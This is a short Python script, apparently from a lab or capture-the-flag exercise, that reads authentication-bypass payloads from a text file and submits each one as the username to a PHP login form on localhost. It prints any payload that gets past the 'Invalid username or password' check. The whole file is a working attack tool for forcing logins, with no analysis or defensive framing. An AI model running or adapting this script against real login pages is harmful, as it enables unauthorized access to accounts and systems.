#!/usr/bin/env python3

import requests

# Open the file containing payloads
with open("Auth Bypass.txt", "r") as file:
    content = file.readlines()

# Strip whitespace and create a list of payloads
payloads = [x.strip() for x in content]

# Iterate through the payloads and test them
for payload in payloads:
    sess = requests.Session()  # Initialize a session

    # Prepare the data for the POST request
    data = {
        "username": payload,
        "password": "admin",
        "submit": "Submit"
    }

    # Send the POST request
    validate = sess.post("http://localhost:9004/index.php", data=data)

    # Check the response
    if "Invalid username or password" in validate.text:
        pass  # Do nothing if login fails
    else:
        print("[+] Success!!\n")
        print(f"[+] Payload: {payload}\n")
